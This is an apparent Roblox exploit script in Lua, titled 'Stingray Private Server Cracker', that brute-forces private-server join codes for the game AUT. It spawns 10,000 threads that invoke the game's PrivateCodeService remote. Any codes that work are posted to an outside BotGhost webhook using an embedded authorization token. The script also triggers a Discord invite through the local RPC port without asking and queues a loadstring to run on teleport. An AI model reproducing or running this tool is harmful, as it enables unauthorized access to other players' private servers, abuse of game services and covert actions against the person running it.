repeat task.wait() until game:IsLoaded()
local function SecureHook(Message)
    local Result = ""
    local C = "abcdefghijklmnopqrstuvwxyz"
    for i = 1, 64 do
        local Rand = math.random(1, #C)
        Result = Result .. C:sub(Rand, Rand)
    end
    local data = {
        variables = {{
            name = "message",
            variable = "{event_message}",
            value = Message
        }, {
            name = "title",
            variable = "{event_title}",
            value = Result
        }}
    }
    local s, e = pcall(function()
        local a = request({
            Url = "https://api.botghost.com/webhook/1107891166940246016/8mu0qk8cgtr07kqw5o0irbw",
            Headers = {
                ['Content-Type'] = 'application/json',
                ['Authorization'] = '976fd7a098cc7f3b0ee971bb9befa6a7a549025a6a45db379d6e53a6c4684da3'
            },
            Body = game:GetService("HttpService"):JSONEncode(data),
            Method = "POST"
        })
    end)
end

local function Display()
    local CG = game:GetService("CoreGui")
	local M = Instance.new("Message")
	M.Parent = CG
	M.Text = 'Stingray Private Server Cracker\n[PLEASE WAIT - CRACKING IN PROGRESS...]'
end

local function Gen()
    local Result = ""
    local C = "abcdefghijklmnopqrstuvwxyz"
    for i = 1, 5 do
        local Rand = math.random(1, #C)
        Result = Result .. C:sub(Rand, Rand)
    end
    return Result
end

local ID = math.random(10, 99)
local Iterate = 10000
print("\n")
print("PS Cracking Starting | ID-" .. tostring(ID))
local Remote = game:GetService("ReplicatedStorage"):WaitForChild("ReplicatedModules"):WaitForChild("KnitPackage")
    :WaitForChild("Knit"):WaitForChild("Services"):WaitForChild("PrivateCodeService"):WaitForChild("RF"):WaitForChild(
        "Invoke")
for i = 1, Iterate do
    task.spawn(function()
        local StartTime = tick()
        local Code = Gen()
        local args = {
            [1] = "JoinCode",
            [2] = {
                ["Code"] = Code
            }
        }
        local Status
        local s, e = pcall(function()
            Status = Remote:InvokeServer(unpack(args))
        end)
        if not s then
            print("Internal Error On Thread ID", i)
        end
        if tostring(Status) ~= "CodeNil" then
            local C = "AUT Private Server Found: " .. string.upper(Code).." | Manta-Testing"
            SecureHook(C)
            print("Thread ID", i, "detached | Time Taken:", math.floor(tick() - StartTime), "| Code Success: ", Code)
        end
        if i == Iterate then
            print("All threads successfully detached | ID-" .. tostring(ID))
        end
    end)
    if i % 100 == 0 then
        task.wait()
    end
end
print(Iterate, "Threads Created | ID-" .. tostring(ID))
pcall(function()
    request({
        Url = "http://127.0.0.1:6463/rpc?v=1",
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json",
            ["origin"] = "https://discord.com"
        },
        Body = game:GetService("HttpService"):JSONEncode({
            ["args"] = {
                ["code"] = "SzdQMf9XBB"
            },
            ["cmd"] = "INVITE_BROWSER",
            ["nonce"] = "."
        })
    })
end)
Display()
if type(queue_on_teleport) == "function" then
    queue_on_teleport([[
        repeat task.wait() until game:IsLoaded()
        if #game:GetService("Players"):GetPlayers()>=2 then
            loadstring()
        end
    ]])
end
